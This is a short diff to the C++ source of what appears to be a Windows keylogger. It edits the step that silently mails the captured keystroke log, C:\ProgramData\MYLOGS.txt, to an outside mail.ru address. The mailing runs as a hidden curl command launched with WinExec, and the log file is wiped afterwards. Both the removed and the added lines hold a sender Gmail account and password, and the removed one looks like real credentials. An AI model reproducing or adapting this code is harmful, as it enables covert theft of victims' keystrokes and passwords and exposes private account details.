@@ -59,7 +59,7 @@ int main()
 				SaveLogs(i, "C:\\ProgramData\\MYLOGS.txt");
 				if (k == 1000)
 				{
-					auto command = "curl --url \"smtps://smtp.gmail.com:465\" --ssl -reqd --mail-from \"knigaykinjan@gmail.com\" --mail-rcpt \"lenavasi78@mail.ru\" --upload-file \"C:\\ProgramData\\MYLOGS.TXT\" --user \"knigaykinjan@gmail.com:44556666\" --insecure";
+					auto command = "curl --url \"smtps://smtp.gmail.com:465\" --ssl -reqd --mail-from \"simple1keylogger1for1project@gmail.com\" --mail-rcpt \"lenavasi78@mail.ru\" --upload-file \"C:\\ProgramData\\MYLOGS.TXT\" --user \"simple1keylogger1for1project@gmail.com:ABCD_1234\" --insecure";
 					WinExec(command, SW_HIDE);
 					Sleep(10000);
 					FILE* f = _wfopen(L"C:\\ProgramData\\MYLOGS.txt", L"w");
